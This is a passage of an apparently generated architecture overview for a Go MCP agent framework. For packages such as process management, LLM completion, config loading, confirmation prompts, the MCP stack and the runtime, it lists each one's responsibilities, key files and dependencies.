**OS Process Management** — utilities for building and managing child OS processes, including cross-platform signal handling (for process lifecycle management of MCP server sub-processes).

### Key Components

| File | Role |
|------|------|
| `builder.go` | Process builder — constructs `exec.Cmd` instances with configured environment, arguments, and I/O plumbing |
| `signals.go` | Cross-platform signal abstraction — common interface for OS signal handling |
| `signal_posix.go` | POSIX-specific signal handling (Linux/macOS) — SIGTERM, SIGINT, etc. |
| `signal_windows.go` | Windows-specific signal handling — equivalent Windows process termination signals |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/mcp/stdio.go` | Used to launch MCP servers as stdio sub-processes |
| `pkg/supervise/` | Used for supervised process management |
| `pkg/envvar/` | Environment variable substitution when building process commands |
| **External: OS** | Direct interaction with the operating system process API |

---

## 7. `pkg/complete/`

### Core Responsibility
**LLM Completion Orchestration** — the central coordinator that takes a prepared conversation context and routes it to the correct LLM provider, returning the completion response. Acts as the bridge between agent logic and provider-specific LLM clients.

### Key Components

| File | Role |
|------|------|
| `complete.go` | Core completion logic — selects the appropriate LLM client based on configuration, sends the request, handles streaming responses, and normalizes results |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/llm/` | Delegates to provider-specific clients (OpenAI, Anthropic) |
| `pkg/llm/completions/` | OpenAI Chat Completions API client |
| `pkg/llm/responses/` | OpenAI Responses API client |
| `pkg/llm/anthropic/` | Anthropic Claude API client |
| `pkg/types/` | Uses `Completer` interface and message types |
| `pkg/sampling/` | Applies sampling configuration (temperature, top_p, etc.) |
| `pkg/agents/` | Called by the agent execution loop |
| **External: OpenAI API** | HTTP calls to `api.openai.com` |
| **External: Anthropic API** | HTTP calls to `api.anthropic.com` |

---

## 8. `pkg/config/`

### Core Responsibility
**Configuration Loading and Resolution** — loads agent and server configuration from multiple sources (YAML files, JSON frontmatter in Markdown, directory-based configs), validates them against schema, and resolves references between agents.

### Key Components

| File | Role |
|------|------|
| `load.go` | Primary config loading entry point — orchestrates loading from file paths or directories |
| `directory.go` | Directory-based config loading — scans a directory structure to assemble a multi-agent configuration |
| `frontmatter.go` | Markdown frontmatter parsing — extracts YAML/JSON config embedded in Markdown files |
| `resolver.go` | Reference resolution — resolves agent-to-agent references and MCP server references within config |
| `schema.go` | Schema loading and management — loads the JSON schema for config validation |
| `schema.yaml` | The actual JSON schema definition for agent configuration |
| `static.go` | Static/embedded config handling — manages configs bundled into the binary |
| `builtin_test.go` | Tests for built-in agent configs |
| `directory_test.go` | Tests for directory config loading (backed by `testdata/`) |
| `frontmatter_test.go` | Tests for frontmatter parsing |
| `load_test.go` | Integration tests for the full loading pipeline |
| `agents/` | Built-in agent definitions embedded in the binary |
| `testdata/` | Extensive test fixtures (20+ scenarios) for various config layouts |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Config type definitions (`AgentConfig`, `MCPServerConfig`, etc.) |
| `pkg/schema/` | JSON schema validation of loaded configurations |
| `pkg/expr/` | Expression evaluation within config values |
| `pkg/envvar/` | Environment variable substitution in config |
| `pkg/fswatch/` | Config hot-reload triggers re-invocation of config loading |
| `pkg/skillformat/` | Validates skill format within agent configs |

---

## 9. `pkg/confirm/`

### Core Responsibility
**User Confirmation Prompts** — provides interactive terminal prompts to request user approval before executing potentially dangerous or irreversible tool calls (human-in-the-loop safety gate).

### Key Components

| File | Role |
|------|------|
| `confirm.go` | Confirmation prompt implementation — displays tool call details and waits for yes/no user input |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Uses tool call and action types for displaying prompt context |
| `pkg/agents/toolcall.go` | Called during tool call execution when confirmation is required |
| **External: Terminal/stdin** | Reads user input from the terminal |

---

## 10. `pkg/envvar/`

### Core Responsibility
**Environment Variable Substitution** — a utility that resolves `${VAR_NAME}` style placeholders within configuration strings, replacing them with actual environment variable values at runtime.

### Key Components

| File | Role |
|------|------|
| `replace.go` | Variable substitution logic — scans strings/maps for env var patterns and replaces them with runtime values |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/config/` | Called during config loading to resolve env vars in configs |
| `pkg/cmd/` | Used when constructing process environment for sub-processes |
| **External: OS environment** | Reads from `os.Getenv()` |

---

## 11. `pkg/expr/`

### Core Responsibility
**Expression Evaluation Engine** — evaluates dynamic expressions and template expansions within agent configurations and tool parameters, enabling dynamic behavior in config definitions.

### Key Components

| File | Role |
|------|------|
| `eval.go` | Expression evaluator — executes expressions against a provided context/data |
| `expand.go` | Template expansion — expands template strings with dynamic values |
| `expand_test.go` | Tests for expansion logic |
| `lookup.go` | Value lookup — resolves variable/path references within an expression context |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/config/` | Expressions are evaluated during config loading/processing |
| `pkg/types/` | Uses context and config types as evaluation input |
| `pkg/sessiondata/` | May use session data as expression context via URI templates |

---

## 12. `pkg/fileuri/`

### Core Responsibility
**File URI Handling** — utilities for converting between filesystem paths and `file://` URI scheme, enabling consistent referencing of local files across the system.

### Key Components

| File | Role |
|------|------|
| `fileuri.go` | File URI conversion — path-to-URI and URI-to-path transformations |
| `fileuri_test.go` | Tests for URI conversion edge cases |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/config/` | Used when resolving file-based config references |
| `pkg/mcp/` | Used when referencing local files as MCP resources |
| **No external dependencies** | Pure URI manipulation utility |

---

## 13. `pkg/fswatch/`

### Core Responsibility
**Filesystem Watching** — monitors configuration files and directories for changes, enabling hot-reload of agent configurations without restarting the server.

### Key Components

| File | Role |
|------|------|
| `watcher.go` | Core filesystem watcher — sets up OS-level file watchers and detects changes |
| `subscriptions.go` | Subscription management — allows multiple consumers to subscribe to file change events |
| `fswatch_test.go` | Tests for watch and subscription behavior |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/config/` | Triggers config reload when watched files change |
| `pkg/runtime/` | Notifies runtime of config changes to reload agent definitions |
| `pkg/log/` | Logs watch events and errors |
| **External: OS filesystem events** | Uses OS-level inotify/kqueue/FSEvents APIs (likely via a Go library) |

---

## 14. `pkg/gormdsn/`

### Core Responsibility
**Database Connection String Management** — generates and manages GORM-compatible DSN (Data Source Name) strings for SQLite database connections, abstracting database path configuration.

### Key Components

| File | Role |
|------|------|
| `dsn.go` | DSN construction — builds SQLite connection strings with appropriate GORM options and file paths |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/session/` | Provides the DSN for session database connections |
| **External: GORM** | Produces DSNs consumed by GORM ORM library |
| **External: SQLite** | Targets SQLite as the database engine |

---

## 15. `pkg/llm/`

### Core Responsibility
**LLM Client Abstractions** — provides a unified interface for communicating with different LLM providers (OpenAI, Anthropic), abstracting provider-specific API details behind a common client interface.

### Key Components

| File/Directory | Role |
|----------------|------|
| `client.go` | Common client interface/factory — defines the `Client` interface and selects the appropriate provider implementation |
| `completions/` | OpenAI Chat Completions API — implements the older `/v1/chat/completions` endpoint (3 files) |
| `responses/` | OpenAI Responses API — implements the newer `/v1/responses` endpoint with richer features (4 files) |
| `anthropic/` | Anthropic Claude API — implements Claude model integration with Anthropic's SDK (4 files) |
| `progress/` | Streaming progress handler — processes streaming tokens/events from LLM responses (1 file) |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Uses `Completer` interface, message types, and config types |
| `pkg/sampling/` | Applies sampling parameters (temperature, max tokens, etc.) to requests |
| `pkg/telemetry/` | Traces LLM API calls via OpenTelemetry |
| `pkg/complete/` | Called by the complete package to execute actual API requests |
| **External: OpenAI API** | HTTP to `api.openai.com` (or compatible endpoints) |
| **External: Anthropic API** | HTTP to `api.anthropic.com` |

---

## 16. `pkg/log/`

### Core Responsibility
**Structured Logging** — provides a centralized, structured logging utility used throughout the application, likely wrapping a standard Go logging library with consistent formatting.

### Key Components

| File | Role |
|------|------|
| `log.go` | Logger setup and export — initializes the logger with appropriate handlers and exposes a package-level logger |
| `log_test.go` | Tests for logging behavior |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| Used by virtually **all packages** | Global logging utility |
| `pkg/telemetry/` | May integrate with OTel for log correlation |
| **External: slog/zap/zerolog** | Wraps a Go logging library (likely `slog` or similar) |

---

## 17. `pkg/mcp/`

### Core Responsibility
**Model Context Protocol (MCP) Implementation** — the full MCP protocol stack, acting as both an MCP client (connecting to external MCP servers) and MCP server host. Manages sessions, tool discovery, tool invocation, OAuth auth, and stdio/HTTP transport.

### Key Components

| File | Role |
|------|------|
| `client.go` | MCP client — establishes connections to MCP servers and sends requests |
| `clientlookup.go` | Client registry — looks up active MCP clients by server name |
| `session.go` | MCP session lifecycle — manages the state of an active MCP connection |
| `sessionstore.go` | Session persistence — stores and retrieves MCP session state |
| `serversession.go` | Server-side session handling — manages state for hosted MCP servers |
| `servertools.go` | Tool registry — discovers and caches tools available from connected servers |
| `runner.go` | MCP server runner — launches and manages MCP server sub-processes |
| `stdio.go` | Stdio transport client — communicates with MCP servers via stdin/stdout |
| `stdioserver.go` | Stdio transport server — exposes nanobot as an MCP server over stdio |
| `httpclient.go` | HTTP/SSE transport client — connects to MCP servers via HTTP |
| `httpserver.go` | HTTP/SSE transport server — exposes nanobot as an MCP server over HTTP |
| `oauth.go` | OAuth for MCP — handles OAuth token flows for authenticated MCP servers |
| `tokenstorage.go` | OAuth token persistence — stores/retrieves OAuth tokens |
| `hooks.go` | MCP lifecycle hooks — callbacks for connection/disconnection events |
| `callback.go` | Callback handling — processes async callbacks from MCP servers |
| `message.go` | MCP message types — request/response message structures |
| `types.go` | MCP type definitions — protocol-level type definitions |
| `context.go` | Context management — carries MCP state through request contexts |
| `pendingrequest.go` | Pending request tracking — manages in-flight MCP requests |
| `logging.go` | MCP-specific logging |
| `error.go` | MCP error types and handling |
| `wellknown.go` | Well-known URL handling for MCP discovery |
| `tracecontext.go` | OpenTelemetry trace propagation through MCP |
| `tracecontext_test.go` | Tests for trace context |
| `auditlogs/` | Audit logging for MCP operations (3 files) |
| `sandbox/` | MCP server sandboxing — security isolation for MCP servers (3 files) |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/types/` | Core type definitions |
| `pkg/cmd/` | Launches MCP server sub-processes |
| `pkg/auth/` | OAuth token management |
| `pkg/session/` | Persists MCP session state |
| `pkg/telemetry/` | Distributed tracing through MCP calls |
| `pkg/log/` | Logging |
| `pkg/reverseproxy/` | TLS proxy for remote MCP servers |
| **External: MCP Servers** | Connects to any compliant MCP server (local or remote) |
| **External: OAuth Providers** | For authenticated MCP server connections |

---

## 18. `pkg/reverseproxy/`

### Core Responsibility
**TLS Reverse Proxy** — provides a custom HTTPS reverse proxy that enables secure communication with remote MCP servers, handling TLS termination and connection management.

### Key Components

| File | Role |
|------|------|
| `server.go` | Proxy server — implements the reverse proxy logic, request forwarding, and connection handling |
| `tlsclient.go` | TLS client — configures TLS settings for outbound connections to upstream MCP servers |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/mcp/` | Used by MCP HTTP client for proxied connections to remote servers |
| **External: Remote MCP servers** | Forwards traffic to upstream MCP server endpoints |
| **External: TLS/x509** | Standard Go TLS library for certificate management |

---

## 19. `pkg/runtime/`

### Core Responsibility
**Agent Runtime Orchestration** — the top-level coordinator that manages the lifecycle of agent executions, wiring together config, MCP servers, sessions, and the agent execution engine into a cohesive runtime.

### Key Components

| File | Role |
|------|------|
| `runtime.go` | Runtime manager — initializes agent runtimes, manages MCP server connections for a given config, and provides the entry point for starting agent conversations |

### Dependencies & Interactions

| Dependency | Nature |
|------------|--------|
| `pkg/agents/` | Delegates actual agent execution loops |
| `pkg/config/` | Loads and provides agent/server configurations |
| `pkg/mcp/` | Initializes and manages MCP server connections |
| `pkg/session/` | Creates and manages conversation sessions |
| `pkg/tools/` | Manages tool availability for the runtime |
| `pkg/types/` | Runtime configuration and execution types |
| `pkg/fswatch/` | Listens for config changes to hot-reload |
| `pkg/telemetry/` | Runtime-level tracing |
| `pkg/api/` | Called by API handlers to create runtime instances |
| `pkg/cli/` | Called by CLI commands for direct execution |

---

## 20. `pkg/sampling/`

### Core Responsibility
**LLM Sampling Configuration** — manages and validates LLM sampling parameters (temperature, top-p, max tokens, etc.) that control the randomness and length of LLM outputs.

### Key Components

| File | Role |
|------|------|
| `sampler.go`

